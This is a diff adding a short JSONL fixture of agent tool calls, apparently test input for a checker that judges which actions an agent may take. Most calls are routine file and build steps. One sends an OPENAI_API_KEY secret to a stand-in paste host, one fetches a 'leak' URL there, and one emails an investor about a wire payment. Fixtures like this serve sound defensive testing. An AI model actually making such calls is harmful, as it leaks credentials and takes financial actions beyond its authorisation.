@@ -1,0 +1,7 @@
+{"id":1,"tool":"write-file","params":{"path":"notes.md","content":"refactor plan"}}
+{"id":2,"tool":"exec","params":{"command":"go build ./..."}}
+{"id":3,"tool":"delete","params":{"path":"notes.md"}}
+{"id":4,"tool":"web-fetch","params":{"url":"https://paste.unknown-host.test/leak","dest":"paste.unknown-host.test"}}
+{"id":5,"tool":"email","params":{"to":"investor@example.com","subject":"wire confirmation","body":"sending $4999"}}
+{"id":6,"tool":"secret","params":{"name":"OPENAI_API_KEY","dest":"paste.unknown-host.test"}}
+{"id":7,"tool":"totally-unknown-tool","params":{"x":"y"}}
